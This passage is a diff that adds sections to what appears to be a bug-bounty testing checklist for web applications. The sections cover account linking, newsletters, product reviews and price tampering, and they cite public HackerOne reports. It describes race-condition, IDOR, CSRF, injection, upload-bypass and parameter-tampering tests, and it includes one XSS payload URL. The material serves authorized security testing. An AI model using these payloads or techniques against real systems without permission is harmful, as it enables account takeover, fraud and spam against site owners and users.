+* [ ] **Simultaneous multi-linking:** Fire concurrent requests using Burp Intruder (Null payloads, single-use connection pool) attempting to link a single Google account to two different application profiles simultaneously.
+* [ ] **Array injection in account identifiers:** If the backend links accounts via an API call like `POST /api/account/link`, attempt to pass an array of accounts to see if multiple third-party accounts get mapped to a single user context:
+
+```json
+{ "identity_provider": "google", "provider_user_id": ["attacker_id", "victim_id"] }
+```
+
+</details>
+
+### Social Media Links
+
+<details>
+
+<summary><strong>Unsafe handle of social media links on profile</strong></summary>
+
+{% embed url="https://hackerone.com/reports/2483422" %}
+
+</details>
+
+<details>
+
+<summary><strong>Change Username to Restricted PATH to Bypass Access Control to IDOR</strong></summary>
+
+{% embed url="https://x.com/Mohnad/status/1886451919276679282" %}
+
+</details>
 
 ### Commenting
 
@@ -1769,5 +2504,191 @@ send the comment
 
 </details>
 
-### Commenting&#x20;
+### Newsletter
+
+<details>
+
+<summary><strong>IDOR</strong></summary>
+
+* [ ] Changing the newsletter ID
+
+</details>
+
+<details>
+
+<summary><strong>Excessive Data Exposure</strong></summary>
+
+* [ ] Sometimes Server Leaks A lot of information in response
+
+</details>
+
+<details>
+
+<summary><strong>CSRF</strong> </summary>
+
+* [ ] Subscribe/unsubscribe option
+
+</details>
+
+<details>
+
+<summary><strong>Injection</strong></summary>
+
+* [ ] SQL Injection in email parameter or other parameters
+* [ ] XSS/HTML Injection
+
+`https://testbuguser.myshopify.com/?contact[email]%20onfocus%3djavascript:alert(%27xss%27)%20autofocus%20a=a&form_type[a]aaa`&#x20;
+
+</details>
+
+<details>
+
+<summary><strong>Unverified User Can Post Newsletter</strong></summary>
+
+{% embed url="https://hackerone.com/reports/1691603" %}
+
+1. Sign up for an account on Linkedin
+2. Without verifying the email, jump directly to the URL : `https://www.linkedin.com/post/new/` to write an article&#x20;
+3. It can be seen that there is no option to create a Newsletter.
+4. Now Login into the account where the Email is verified and try to create a newsletter.
+5. Click on Done and capture the vulnerable request and replay the request with the unverified user cookies. and the newsletter will be successfully created.
+
+</details>
+
+<details>
+
+<summary><strong>BAC by Filling the form with other's email</strong></summary>
+
+{% embed url="https://hackerone.com/reports/145396" %}
+
+The mentioned URL contains a form that, when supplied correct user emails, unsubscribes users from the newsletters they're subscribed to. If the user is not subscribed, the form returns a message that says that the user is not subscribed if this is the case.
+
+</details>
+
+<details>
+
+<summary><strong>No Rate Limit</strong></summary>
+
+{% embed url="https://hackerone.com/reports/145612" %}
+
+> The lack of a captcah or verificationcodeX (it's empty) in your phplist configuration allows attackers to use this mail for to send as much spam as they like to victims. I did not reach an email sending limit when I had tested this.
+
+
+
+* [ ] No Captcha or Rate Limit Leads to Email Spam
+
+</details>
+
+<details>
+
+<summary><strong>Host header injection/redirection via newsletter signup</strong></summary>
+
+{% embed url="https://hackerone.com/reports/229498" %}
+
+> There's a host header injection vulnerability via all newsletter signups in the referrer attribute. This works with all pages that have "Join our email list" signup boxes.
+>
+> **Since the referrer attribute can be changed to an outside domain the email being received redirects all links within the "Welcome to Starbucks" email. So in result the member is redirected to a malicious site from the email they used.**
+
+</details>
+
+### Product  Review
+
+<details>
+
+<summary>Bypass "Verified Purchase" status</summary>
+
+Analyze the request payload when submitting a review. Look for boolean flags or attributes such as `"is_verified": false`, `"purchased": false`, or `"status": "unverified"`.&#x20;
+
+Flip them to `true` or `"verified"` to see if your review receives the trusted badge without an actual purchase.
+
+</details>
+
+<details>
+
+<summary>Out-of-bounds ratings (Scale manipulation)</summary>
+
+Locate the numerical rating parameter (e.g., "rating": 5 or score=5). Attempt to pass values outside the intended 1–5 scale, such as 6, 0, -1, or extreme numbers like 99999 and -99999. Check if this breaks the global score calculation or causes database/UI rendering errors.
+
+</details>
+
+<details>
+
+<summary>Review impersonation (IDOR)</summary>
+
+Test if you can submit a review under another user's identity by tampering with parameters like user\_id, author\_id, or username inside the review creation payload.
+
+</details>
+
+<details>
+
+<summary>Duplicate review submission</summary>
+
+Attempt to post multiple reviews or ratings for a single product from the same account if the UI restricts you to only one.
+
+</details>
+
+<details>
+
+<summary>Race condition on rating aggregation</summary>
+
+Intercept the rating submission request and send multiple concurrent requests simultaneously using a single-use connection pool (e.g., Burp Suite's Turbo Intruder). Check if the application increments the total rating counter multiple times or skews the product's average rating logic unfairly.
+
+</details>
+
+<details>
+
+<summary>CSRF on review posting</summary>
+
+Check if the submission endpoint (POST /api/reviews) lacks anti-CSRF tokens or strict SameSite cookie protections. If vulnerable, an attacker could force authenticated victims to silently post spam reviews or malicious links.
+
+</details>
+
+<details>
+
+<summary>Arbitrary file extension upload </summary>
+
+If the review allows attaching photos or videos, try bypassing client-side validation to upload unauthorized extensions (e.g., .php, .jsp, .html, .svg, or .exe).
+
+</details>
+
+<details>
+
+<summary>Content-Type &#x26; Magic Byte spoofing</summary>
+
+Intercept the image upload request and change the Content-Type header (e.g., from image/jpeg to text/html) or append a malicious payload behind authentic image magic bytes to test for stored Cross-Site Scripting (XSS) or Remote Code Execution (RCE).
+
+</details>
+
+<details>
+
+<summary>Client-side trust in price calculations</summary>
+
+Inspect final state generation or quotation requests (like the /prepare\_offer endpoint) sent just before payment or signing. Look for fields calculated dynamically on the frontend, such as:
+
+```json
+{
+  "customer_name": "John Doe",
+  "yearly_rate": "3644",
+  "is_young": false
+}
+
+```
+
+</details>
+
+<details>
+
+<summary>Parameter alteration</summary>
+
+Manually decrease numerical value parameters like `yearly_rate`, `total_price`, or `amount_due` to a lower value (e.g., "1") or a negative value to verify if the server signs and processes the updated offer blindly.
+
+</details>
+
+<details>
+
+<summary>State flag tampering</summary>
+
+Toggle risk-assessment parameters directly inside the request payload—such as changing `"is_young": true` to `false` or `"high_risk": true` to `false`—to artificially unlock lower premium rates or discounts
+
+</details>
 
